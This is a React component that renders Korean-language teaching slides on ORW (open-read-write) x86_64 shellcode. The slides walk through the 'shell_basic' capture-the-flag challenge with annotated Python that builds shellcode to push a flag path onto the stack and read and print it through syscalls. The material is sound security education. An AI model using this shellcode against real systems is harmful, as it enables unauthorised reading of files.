import { MarkdownSlides } from "@/components/markdown-slides";

const slides = [
  `# 4주차. ORW 셸코드와 shell_basic 분석
  <br>

  지난 주차에 배운 레지스터와 어셈블리 지식을 바탕으로 ORW 셸코드를 이해하고 shell_basic 문제를 직접 분석합니다.
  <br>
  <br>

  ## 목표
  <br>

  - ORW 셸코드 동작 원리 이해
  - 파일명을 스택에 올리는 방법 이해
  - syscall로 파일을 읽고 출력하는 셸코드 분석`,

  `# 오늘 멘토링 내용
  <br>

  ## ORW 셸코드
  <br>

  ## 코드 분석 1 — 파일명을 스택에 올리기
  <br>

  ## 코드 분석 2 — syscall로 파일 읽고 출력하기`,

  `# ORW 셸코드
  <br>

  ## Open → Read → Write
  <br>

  \`\`\`
  open("/path/to/flag", O_RDONLY)  →  fd (파일 디스크립터) 반환
       ↓
  read(fd, buf, size)              →  파일 내용을 메모리(buf)에 읽어옴
       ↓
  write(1, buf, size)              →  buf 내용을 stdout(fd=1)으로 출력
  \`\`\`

  <br>

  ## Linux syscall 번호 (x86_64)
  <br>

  | syscall | 번호 (rax) | rdi | rsi | rdx |
  |---------|-----------|-----|-----|-----|
  | \`read\`  | 0 | fd | buf | size |
  | \`write\` | 1 | fd | buf | size |
  | \`open\`  | 2 | filename | flags | - |

  - \`O_RDONLY = 0\` (읽기 전용)
  - stdout의 fd = **1**, stderr의 fd = **2**`,

  `# 코드 분석 1
  <br>

  ## 파일명을 스택에 올리기
  <br>

  \`\`\`python
  filepath = b"/home/shell_basic/flag_name_is_loooooong\\x00"

  # 8바이트씩 분할 후 역순으로 push (스택은 높은 주소 → 낮은 주소로 쌓임)
  while len(filepath) % 8 != 0:
      filepath += b"\\x00"              # 8바이트 정렬을 위한 패딩

  chunks = [filepath[i:i+8] for i in range(0, len(filepath), 8)]
  chunks.reverse()

  for chunk in chunks:
      val = u64(chunk)
      shellcode += b"\\x48\\xb8" + p64(val)   # mov rax, <8바이트 값>
      shellcode += b"\\x50"                   # push rax
  \`\`\`

  \`\`\`
  스택 (낮은 주소 ↑)
  ┌─────────────────────┐  ← rsp (push 완료 후)
  │  /home/shell_basic/ │
  │  flag_name_is_looo  │
  │  oooong\\x00\\x00\\x00 │
  └─────────────────────┘
  \`\`\``,

  `# 코드 분석 2
  <br>

  ## syscall로 파일 읽고 출력하기
  <br>

  \`\`\`python
  # open(rsp, O_RDONLY)  →  rax = fd
  shellcode += b"\\x48\\x89\\xe7"          # mov rdi, rsp  (파일명 주소)
  shellcode += b"\\x48\\x31\\xf6"          # xor rsi, rsi  (O_RDONLY = 0)
  shellcode += b"\\x48\\x31\\xd2"          # xor rdx, rdx
  shellcode += b"\\xb8\\x02\\x00\\x00\\x00" # mov eax, 2    (open)
  shellcode += b"\\x0f\\x05"              # syscall

  # read(fd, rsp, 200)  →  파일 내용을 스택에 읽어옴
  shellcode += b"\\x48\\x89\\xc7"          # mov rdi, rax  (fd)
  shellcode += b"\\x48\\x89\\xe6"          # mov rsi, rsp  (buf = rsp)
  shellcode += b"\\xba\\xc8\\x00\\x00\\x00" # mov edx, 200
  shellcode += b"\\x48\\x31\\xc0"          # xor rax, rax  (read = 0)
  shellcode += b"\\x0f\\x05"              # syscall

  # write(1, rsp, 실제 읽은 크기)  →  stdout으로 출력
  shellcode += b"\\x48\\x89\\xc2"          # mov rdx, rax  (읽은 바이트 수)
  shellcode += b"\\xbf\\x01\\x00\\x00\\x00" # mov edi, 1    (stdout)
  shellcode += b"\\x48\\x89\\xe6"          # mov rsi, rsp
  shellcode += b"\\xb8\\x01\\x00\\x00\\x00" # mov eax, 1    (write)
  shellcode += b"\\x0f\\x05"              # syscall
  \`\`\``,
];

export function Week4OrwShellcodeDeck() {
  return <MarkdownSlides slides={slides} />;
}
